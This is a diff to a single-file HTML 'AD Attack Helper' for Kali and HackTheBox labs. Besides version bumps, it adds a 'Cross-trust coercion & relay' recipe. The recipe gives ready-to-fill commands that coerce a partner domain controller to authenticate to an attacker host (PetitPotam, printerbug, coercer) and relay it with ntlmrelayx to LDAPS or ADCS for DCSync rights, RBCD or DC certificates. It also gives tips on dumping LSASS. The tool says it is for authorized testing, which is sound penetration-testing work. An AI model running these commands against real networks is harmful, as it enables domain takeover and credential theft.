@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.13.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.14.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -221,7 +221,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.13.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.14.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -276,7 +276,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.13.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.14.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -1162,7 +1162,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.13.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.14.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -2248,7 +2248,7 @@ cmds:[
  [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'spooler (MS-RPRN)'],
  [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'EFSRPC'],
  [`impacket-dfscoerce '{{domain}}/{{user}}:{{password}}@{{target_host}}' '{{domain}}/{{dc_host}}'`,'DFS coerce']
-],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.'});
+],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.<br>Across a domain trust the target is <span class="mono">{{trust_dc_ip}}</span> — see the Cross-trust coercion & relay card.'});
 
 R({id:'mitm6',cat:'relay',title:'mitm6 — IPv6 DNS takeover + relay',desc:'When LLMNR/NBT-NS are quiet: take over DNS via DHCPv6 and relay the authentication that follows.',
 cmds:[
@@ -2587,7 +2587,7 @@ cmds:[
  [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of the TRUSTED domain'],
  [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts)']
-],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card.<br>Next steps: cross-domain roasting, SID history, foreign group membership.<br>Queries run over <b>LDAPS (636)</b> (<span class="mono">LDAPTLS_REQCERT=never</span>); fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
+],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card.<br>Next steps: cross-domain roasting, SID history, foreign group membership, coercion/relay across the trust.<br>Queries run over <b>LDAPS (636)</b> (<span class="mono">LDAPTLS_REQCERT=never</span>); fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
 cmds:[
@@ -2636,6 +2636,20 @@ cmds:[
  [`nxc smb {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>'`,'use credentials from the owning domain against this one'],
  [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>' --groups`,'enumerate as the foreign user']
 ],note:'Two directions: (1) foreign principals nested in <b>your</b> groups are an entry path for credentials from their home domain; (2) your user nested in a foreign group grants you access there. BloodHound shows both via the "Foreign group members (cross-domain)" query in the BloodHound tab. Memberships only translate into access where the resource domain accepts the authenticating user.<br>The lookup runs over <b>LDAPS (636)</b> with <span class="mono">LDAPTLS_REQCERT=never</span>; fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
+
+R({id:'trust-coerce-relay',cat:'trust',title:'Cross-trust coercion & relay',desc:'Force a DC of the partner domain to authenticate to you, then relay that machine account inside the partner domain (LDAP(S)/ADCS) — or into an unconstrained host of your own domain.',
+cmds:[
+ [`nxc smb {{trust_dc_ip}} -d {{domain}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'coerce the partner DC to your listener'],
+ [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}' {{attacker_ip}}`,'spooler (MS-RPRN)'],
+ [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}' {{attacker_ip}}`,'EFSRPC'],
+ [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}' '\\\\{{attacker_ip}}@80\\a'`,'WebDAV listener — HTTP-sourced auth for LDAP/ADCS relay'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{trust_dc_ip}} -l {{attacker_ip}}`,'try every coercion vector'],
+ [`impacket-ntlmrelayx -t ldaps://{{trust_dc_ip}} -smb2support --escalate-user '{{target_user}}'`,'relay to partner LDAPS → DCSync rights for a partner account','n'],
+ [`impacket-ntlmrelayx -t ldaps://{{trust_dc_ip}} --delegate-access -smb2support`,'or RBCD on a partner machine','n'],
+ [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`,'ESC8: partner CA issues a DC certificate','n'],
+ [`certipy relay -target 'rpc://{{ca_host}}' -ca '{{ca}}' -template DomainController`,'ESC11: relay into the partner CA RPC','n'],
+ [`nxc smb {{trust_dc_ip}} -d {{domain}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{target_host}}`,'unconstrained cross-domain: coerce partner DC to a host of YOUR domain']
+],note:'The coerced identity is the <b>partner DC machine account</b> — it is validated by its own domain, so relay it to services in the partner domain (<span class="mono">{{trust_dc_ip}}</span>): LDAP(S) for ACL/RBCD abuse, ADCS for a DC certificate. Credentials you fire the coercion with belong to your domain (<span class="mono">-d {{domain}}</span>).<br>Checks before you start: <span class="mono">nxc ldap {{trust_dc_ip}} -u … -M ldap-checker</span> (signing/channel binding; <b>Server 2025 enables EPA by default</b> for LDAP and ADCS), and the trust direction from trust-enum — the partner (resource domain) must trust your domain for pass-through. <b>Selective authentication</b> blocks cross-domain resource access without "Allowed to Authenticate"; NTLM restrictions can break pass-through entirely.<br><b>Protocol detail:</b> SMB-sourced NTLM carries signing flags and is often refused by LDAP/ADCS HTTP — use the WebDAV listener (<span class="mono">\\\\{{attacker_ip}}@80\\a</span>) so the auth arrives over HTTP. Need admin on an unconstrained-delegation host in your own domain? Coerce the partner DC into it (intra-forest trusts allow machine auth across), dump LSASS and DCSync the partner — no relay needed. DC machine passwords are 120 random chars: cracking is pointless, relay or steal the TGT.'});
 
 /* ===== BLOODHOUND COLLECTION ===== */
 R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
@@ -2773,6 +2787,7 @@ need:['user'], needAny:['password','nthash','ccache'],
 steps:[
  {t:'Enumerate the trusts',d:'Understand direction and which domain you control.',r:['trust-enum']},
  {t:'Cross-domain & SID history',d:'Roast the other domain, forge extra-SID tickets with the trust key, and check foreign group memberships.',r:['trust-cross-domain-roast','trust-sid-history','trust-foreign-groups']},
+ {t:'Coerce & relay across the trust',d:'Force a DC in the partner domain to authenticate to you, then relay it to LDAP(S)/ADCS there — or into an unconstrained host of your own domain.',req:'a valid account in your domain that the partner trusts + a reachable relay or unconstrained target',r:['trust-coerce-relay','relay-coerce']},
  {t:'Abuse the trust',d:'Trust key extraction + inter-realm golden ticket, or raiseChild.',req:'Domain Admin / DCSync rights in the child domain (trust key)',r:['trust-raisechild']},
  {t:'Hybrid identity',d:'AD Connect connector accounts (MSOL/ADSync) and AD FS Golden SAML bridge on-prem AD into Entra ID and federated apps.',r:['entra-connect','adfs-goldensaml']},
  {t:'Dump',d:'Once the parent DC accepts your ticket, DCSync it.',r:['creds-dcsync']}
@@ -3085,7 +3100,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.13.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.14.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -3178,7 +3193,7 @@ const REQS = {
   'mssql-connect':['mssql'], 'mssql-xpcmdshell':['mssql'], 'mssql-impersonate':['mssql'],
   'mssql-linked':['mssql'], 'mssql-coerce':['mssql','coercion'], 'mssql-alt-rce':['mssql'],
   'trust-enum':['creds'], 'trust-raisechild':['da'], 'trust-cross-domain-roast':['trustedcreds'],
-  'trust-sid-history':['trustkey','da'], 'trust-foreign-groups':['creds'],
+  'trust-sid-history':['trustkey','da'], 'trust-foreign-groups':['creds'], 'trust-coerce-relay':['creds','coercion'],
   'bh-python':['creds'], 'bh-nxc':['creds'],
   'bhcli-setup':['shell','bh'], 'bhcli-recon':['bh'], 'bhcli-cypher':['bh'], 'bhcli-alternatives':['bh']
 };
